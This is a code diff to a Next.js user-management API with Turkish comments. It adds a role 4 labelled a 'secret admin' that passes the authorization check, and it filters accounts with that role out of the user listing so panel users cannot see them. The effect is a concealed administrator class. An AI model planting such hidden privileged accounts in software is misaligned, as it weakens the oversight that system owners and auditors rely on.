@@ -46,7 +46,8 @@ async function getRequesterProfile(req: NextRequest) {
       return { error: "Profil bulunamadı." }
     }
 
-    if (profile.role_id !== 2) {
+    // 2 = muhasebe, 4 = gizli admin
+    if (profile.role_id !== 2 && profile.role_id !== 4) {
       return { error: "Bu işlem için yetkiniz yok." }
     }
 
@@ -64,9 +65,11 @@ export async function GET(req: NextRequest) {
       return NextResponse.json({ error: authCheck.error }, { status: 403 })
     }
 
+    // Gizli admin kullanıcıları listede göstermiyoruz
     const { data: users, error: usersError } = await adminClient
       .from("profiles")
       .select("id, full_name, email, role_id, manager_id, department_id, is_active")
+      .neq("role_id", 4)
       .order("is_active", { ascending: false })
       .order("full_name", { ascending: true })
 
@@ -129,6 +132,7 @@ export async function POST(req: NextRequest) {
       )
     }
 
+    // Panelden sadece 1,2,3 oluşturulabilir. 4 gizli admindir.
     if (![1, 2, 3].includes(Number(role_id))) {
       return NextResponse.json({ error: "Geçersiz rol." }, { status: 400 })
     }
@@ -295,6 +299,10 @@ export async function PATCH(req: NextRequest) {
 
     if (!id) {
       return NextResponse.json({ error: "Kullanıcı id gerekli." }, { status: 400 })
+    }
+
+    if (role_id !== undefined && ![1, 2, 3].includes(Number(role_id))) {
+      return NextResponse.json({ error: "Geçersiz rol." }, { status: 400 })
     }
 
     if (password !== undefined && password !== null && String(password).trim() !== "") {
